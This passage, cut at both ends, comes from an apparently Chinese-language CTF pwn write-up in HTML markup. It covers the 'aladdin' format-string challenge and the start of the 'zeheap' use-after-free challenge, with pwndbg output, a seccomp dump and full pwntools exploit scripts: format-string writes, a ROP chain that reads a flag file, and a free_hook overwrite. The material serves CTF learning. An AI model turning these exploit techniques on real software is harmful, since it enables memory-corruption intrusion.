class="token number">00</span>d8│  <span class="token number">0x7fffffffde58</span> ◂— <span class="token number">0x163fe5f2dcc3a00</span><span class="token number">1</span>c<span class="token operator">:</span><span class="token number">00e0</span>│  <span class="token number">0x7fffffffde60</span> ◂— <span class="token number">0x0</span><span class="token number">1</span>d<span class="token operator">:</span><span class="token number">00e8</span>│  <span class="token number">0x7fffffffde68</span> —▸ <span class="token number">0x7ffff7dbce40</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">)</span> ◂— mov r15<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0x1ef159</span><span class="token punctuation">]</span><span class="token number">1</span>e<span class="token operator">:</span><span class="token number">00f</span><span class="token number">0</span>│  <span class="token number">0x7fffffffde70</span> —▸ <span class="token number">0x7fffffffdee8</span> —▸ <span class="token number">0x7fffffffe28f</span> ◂— <span class="token char">'GJS_DEBUG_TOPICS=JS ERROR;JS LOG'</span><span class="token number">1f</span><span class="token operator">:</span><span class="token number">00f</span><span class="token number">8</span>│  <span class="token number">0x7fffffffde78</span> —▸ <span class="token number">0x555555557d88</span> <span class="token punctuation">(</span>__do_global_dtors_aux_fini_array_entry<span class="token punctuation">)</span> —▸ <span class="token number">0x5555555551e0</span> <span class="token punctuation">(</span>__do_global_dtors_aux<span class="token punctuation">)</span> ◂— endbr64 pwndbg<span class="token operator">></span> fmtarg <span class="token number">0x7fffffffddd8</span>The index of format argument <span class="token operator">:</span> <span class="token number">17</span> <span class="token punctuation">(</span><span class="token string">"\%16$p"</span><span class="token punctuation">)</span>pwndbg<span class="token operator">></span> fmtarg <span class="token number">0x7fffffffde00</span>The index of format argument <span class="token operator">:</span> <span class="token number">22</span> <span class="token punctuation">(</span><span class="token string">"\%21$p"</span><span class="token punctuation">)</span>pwndbg<span class="token operator">></span> fmtarg <span class="token number">0x7fffffffde68</span>The index of format argument <span class="token operator">:</span> <span class="token number">35</span> <span class="token punctuation">(</span><span class="token string">"\%34$p"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入的<code>wish</code>是<code>bss</code>段的，也就是非栈上的格式化字符串，需要用栈作为跳板去改其他地方的数据，本题的利用思路就是第一次输入用于泄露地址，第二次输入用来设置跳板，第三次输入用来改<code>printf</code>返回地址到<code>val</code>中的输入，继续输入改<code>chance</code>值，但也不能改太大，用到的链如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x7fffffffdde8 —▸ 0x7fffffffded8 —▸ 0x7fffffffe260 ◂— <span class="token string">'/home/starrysky/game_2024/beginctf/aladdin/pwn'</span>0x7fffffffde70 —▸ 0x7fffffffdee8 —▸ 0x7fffffffe28f ◂— <span class="token string">'GJS_DEBUG_TOPICS=JS ERROR;JS LOG'</span>pwndbg<span class="token operator">></span> fmtarg 0x7fffffffdde8The index of <span class="token function">format</span> argument <span class="token builtin class-name">:</span> <span class="token number">19</span> <span class="token punctuation">(</span><span class="token string">"\%18<span class="token variable">$p</span>"</span><span class="token punctuation">)</span>pwndbg<span class="token operator">></span> fmtarg 0x7fffffffde70The index of <span class="token function">format</span> argument <span class="token builtin class-name">:</span> <span class="token number">36</span> <span class="token punctuation">(</span><span class="token string">"\%35<span class="token variable">$p</span>"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改成功后就可以无限利用<code>fmt</code>，但这题有沙箱，只能<code>orw</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aladdin  seccomp-tools dump ./pwn                  line  CODE  JT   JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 0000: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number 0001: 0x15 0x01 0x00 0x0000003b  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execve<span class="token punctuation">)</span> goto 0003 0002: 0x35 0x01 0x00 0x00000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">>=</span> 0x0<span class="token punctuation">)</span> goto 0004 0003: 0x06 0x00 0x00 0x00050000  <span class="token builtin class-name">return</span> ERRNO<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 0004: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是把栈直接改<code>orw</code>比较麻烦，所以可以在返回地址先构造<code>read</code>，然后用<code>read</code>读<code>rop</code>链实现<code>orw</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span> <span class="token number">30879</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pay</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    tar <span class="token operator">=</span> target <span class="token operator">&amp;</span> <span class="token number">0xffff</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        val <span class="token operator">=</span> value <span class="token operator">&amp;</span> <span class="token number">0xffff</span>        value <span class="token operator">=</span> value <span class="token operator">>></span> <span class="token number">16</span>        p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>tar<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%36$hn'</span>        r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%52$hn'</span>        r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        tar <span class="token operator">+=</span> <span class="token number">0x2</span>p <span class="token operator">=</span> <span class="token string">b'%17$p%22$p%35$p'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>code <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1229</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x29e40</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x160</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>target1 <span class="token operator">=</span> <span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0xd0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token keyword">if</span> target1 <span class="token operator">></span> target<span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%19$hn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>target1 <span class="token operator">-</span> target<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%36$hn'</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%19$hn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x10000</span> <span class="token operator">+</span> target1 <span class="token operator">-</span> target<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%36$hn'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x137F</span> <span class="token operator">+</span> code<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>chance <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x4010</span> <span class="token operator">+</span> code<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token keyword">if</span> chance <span class="token operator">></span> addr<span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%49$hn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>chance <span class="token operator">-</span> addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%52$hn'</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%49$hn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x10000</span> <span class="token operator">+</span> chance <span class="token operator">-</span> addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%52$hn'</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%23$hn'</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x000000000002a3e5</span> <span class="token operator">+</span> libc_basepop_rsi_ret <span class="token operator">=</span> <span class="token number">0x000000000002be51</span> <span class="token operator">+</span> libc_basepop_rdx_ret <span class="token operator">=</span> <span class="token number">0x00000000000796a2</span> <span class="token operator">+</span> libc_basestack <span class="token operator">-=</span> <span class="token number">0x10</span>ret <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x110</span> <span class="token operator">+</span> <span class="token number">0x38</span> <span class="token operator">+</span> <span class="token number">0x10</span>read <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basepay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span><span class="token punctuation">,</span> pop_rdi_ret<span class="token punctuation">)</span>pay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> pop_rsi_ret<span class="token punctuation">)</span>pay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span>pay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">,</span> pop_rdx_ret<span class="token punctuation">)</span>pay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x300</span><span class="token punctuation">)</span>pay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">,</span> read<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x30</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%36$hn'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%52$hn'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x30</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%36$hn'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%52$hn'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>open_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basewrite_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basepop_rax_ret <span class="token operator">=</span> <span class="token number">0x0000000000045eb0</span> <span class="token operator">+</span> libc_basesyscall <span class="token operator">=</span> <span class="token number">0x0000000000029db4</span> <span class="token operator">+</span> libc_baseorw_rop_addr <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x18</span> <span class="token operator">+</span> <span class="token number">0x10</span>orw_rop  <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>orw_rop_addr<span class="token operator">+</span><span class="token number">0xb8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>orw_rop_addr<span class="token operator">+</span><span class="token number">0xb8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>orw_rop_addr<span class="token operator">+</span><span class="token number">0xb8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> <span class="token string">b'flag'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'broken'</span><span class="token punctuation">,</span> orw_rop<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="zeheap"><a href="#zeheap" class="headerlink" title="zeheap"></a>zeheap</h2><p>存在<code>uaf</code>漏洞，但是<code>edit</code>和<code>show</code>受到<code>mark</code>的限制</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unsigned __int64 <span class="token function-name function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  unsigned int index<span class="token punctuation">;</span> // <span class="token punctuation">[</span>rsp+4h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp-Ch<span class="token punctuation">]</span> BYREF  unsigned __int64 v2<span class="token punctuation">;</span> // <span class="token punctuation">[</span>rsp+8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp-8h<span class="token punctuation">]</span>  v2 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>  puts<span class="token punctuation">(</span><span class="token string">"num:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>, <span class="token operator">&amp;</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> index <span class="token operator">&lt;=</span> 0xF <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    free<span class="token punctuation">(</span>heap_ptr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    mark<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token builtin class-name">return</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span> ^ v2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>unsorted bin</code>中的堆重复释放到<code>tcache</code>中，就可以利用这个堆泄露<code>libc</code>地址，并且将<code>tcache</code>中的堆和<code>unsorted bin</code>中的堆都申请出来就可以造成堆块复用，其中一个释放到<code>tcache</code>再用另一个改<code>fd</code>为<code>free_hook</code>最后申请出来改成<code>system</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choose:'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'num:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choose:'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'num:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'read:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choose:'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'num:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choose:'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token 